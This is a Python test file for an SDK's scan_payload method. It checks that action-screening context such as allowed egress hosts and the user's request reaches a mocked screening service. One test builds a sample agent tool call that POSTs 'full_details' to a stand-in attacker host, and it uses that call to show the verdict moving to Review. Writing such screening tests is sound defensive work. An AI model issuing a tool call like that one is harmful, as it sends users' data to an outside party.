"""Action-screening context forwarding for scan_payload."""

from __future__ import annotations

import json

import httpx

from surface import SurfaceClient
from surface.models import ActionContext

def _resp(level: str, action: str) -> dict:
    return {
        "name": "payload.json", "size": 10, "hash": "abc", "contentType": "application/json",
        "safetyScore": {
            "score": 5, "threatLevel": level, "confidence": "High", "confidenceScore": 0.9,
            "confidenceReason": "", "primaryThreat": "", "threatSummary": "", "enginesUsed": [],
            "recommendedAction": action, "coverage": "partial",
        },
        "scanTimeMs": 1, "timestamp": 0,
    }


CLEAN = _resp("Clean", "Allow")


def _client(handler) -> SurfaceClient:
    c = SurfaceClient(api_key="sfk_test")
    c._client = httpx.Client(base_url=c.base_url, transport=httpx.MockTransport(handler))
    return c


def test_context_forwarded_in_body():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload(
        '{"tool":"create_payment","args":{"iban":"GB29NWBK60161331926819"}}',
        "payment.json",
        context=ActionContext(
            principal_domains=["acme.io"],
            allowed_egress=["api.stripe.com", "hooks.slack.com"],
            user_request="summarize this week's tickets",
        ),
    )
    ctx = seen.get("context")
    assert ctx, f"no context in body: {seen}"
    assert ctx["user_request"] == "summarize this week's tickets"
    assert ctx["allowed_egress"] == ["api.stripe.com", "hooks.slack.com"]
    # exclude_none keeps the payload lean.
    assert "known_payees" not in ctx


def test_context_accepts_plain_dict():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload("x", context={"principal_domains": ["acme.io"]})
    assert seen["context"] == {"principal_domains": ["acme.io"]}


def test_context_absent_when_not_supplied():
    seen: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(json.loads(request.content))
        return httpx.Response(200, json=CLEAN)

    _client(handler).scan_payload("x")
    assert "context" not in seen


def test_context_flips_verdict_through_sdk():
    host = "webhook.attacker-collect.io"

    def handler(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        egress = (body.get("context") or {}).get("allowed_egress")
        # Model the screener: egress to a host outside a declared allowed_egress
        # is Review; with no context, it is Allow.
        if egress and host not in egress:
            return httpx.Response(200, json=_resp("Suspicious", "Review"))
        return httpx.Response(200, json=_resp("Clean", "Allow"))

    payload = (
        '{"tool":"http_request","args":{"method":"POST",'
        '"url":"https://' + host + '/i","body":{"full_details":true}}}'
    )
    with_ctx = _client(handler).scan_payload(
        payload,
        context=ActionContext(principal_domains=["acme.io"], allowed_egress=["api.stripe.com"]),
    )
    without = _client(handler).scan_payload(payload)
    assert with_ctx.safety_score.recommended_action == "Review"
    assert without.safety_score.recommended_action == "Allow"
